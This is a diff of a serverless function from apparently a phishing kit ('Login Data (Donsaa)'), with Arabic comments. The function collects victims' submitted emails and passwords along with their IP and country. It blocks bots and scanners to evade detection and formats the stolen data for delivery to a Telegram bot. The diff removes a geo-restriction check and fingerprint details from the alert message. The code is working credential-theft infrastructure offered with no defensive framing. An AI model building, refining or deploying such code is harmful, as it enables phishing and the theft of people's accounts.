@@ -27,14 +27,10 @@ exports.handler = async (event, context) => {
     }
 
     const ip = getClientIp(event.headers); 
-    const countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; // سنظل نسجل البلد في الرسالة
+    const countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; 
     
     // ----------------------------------------------------------------
-    // 1. **(تم إزالة فحص Geo-Restriction بالكامل)**
-    // ----------------------------------------------------------------
-    
-    // ----------------------------------------------------------------
-    // 2. تحليل بيانات البصمة وتطبيق الحظر (Bot/Human Check)
+    // 1. تحليل بيانات البصمة وتطبيق الحظر (Bot/Human Check)
     // ----------------------------------------------------------------
     
     const bodyParams = new URLSearchParams(event.body);
@@ -60,7 +56,7 @@ exports.handler = async (event, context) => {
     }
 
     // ----------------------------------------------------------------
-    // 3. تطبيق الحظر الصارم (Bot Block)
+    // 2. تطبيق الحظر الصارم (Bot Block)
     // ----------------------------------------------------------------
     if (isBlocked) {
         console.log(`[BLOCKED BOT] Bot detected: ${securityStatus} from IP: ${ip}, Country: ${countryCode}`);
@@ -74,7 +70,7 @@ exports.handler = async (event, context) => {
     }
 
     // ----------------------------------------------------------------
-    // 4. معالجة الزوار الحقيقيين (Human - Send Telegram Alert)
+    // 3. معالجة الزوار الحقيقيين (Human - Send Telegram Alert)
     // ----------------------------------------------------------------
     
     const safe_email = escapeMarkdownV2(email);
@@ -82,25 +78,20 @@ exports.handler = async (event, context) => {
     const safe_ip = escapeMarkdownV2(ip);
     const safe_country = escapeMarkdownV2(countryCode);
 
-    let fpDetails = '';
-    if (fpData) {
-        fpDetails += `Human: ${fpData.isHuman ? 'Yes' : 'No'}\n`;
-        fpDetails += `Interaction Count: ${fpData.interactionCount}\n`;
-        fpDetails = escapeMarkdownV2(fpDetails);
-    }
-
-    // تشكيل الرسالة (إضافة البلد)
+    // ********** تم حذف fpDetails: **********
+    
+    // تشكيل الرسالة (إضافة البلد وتنسيق الرسالة)
     let message_text = `👤 *Login Data \\(Donsaa\\)* 👤\n\n`;
     message_text += `*STATUS: ${securityStatus}*\n\n`;
     message_text += `E\\-Mail: \`${safe_email}\`\n`;
     message_text += `Passwort: \`${safe_password}\`\n`;
     message_text += `IP: \`${safe_ip}\`\n`;
-    message_text += `Country: \`${safe_country}\`\n\n`; // ما زلنا نسجل البلد للتشخيص
-    message_text += `*FP Details:*\n`;
-    message_text += `${fpDetails}`;
+    message_text += `Country: \`${safe_country}\`\n`; // <--- تم إضافة البلد
+    
+    // ********** تم حذف قسم *FP Details:* **********
 
     // ----------------------------------------------------------------
-    // 5. إرسال البيانات إلى Telegram 
+    // 4. إرسال البيانات إلى Telegram 
     // ----------------------------------------------------------------
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
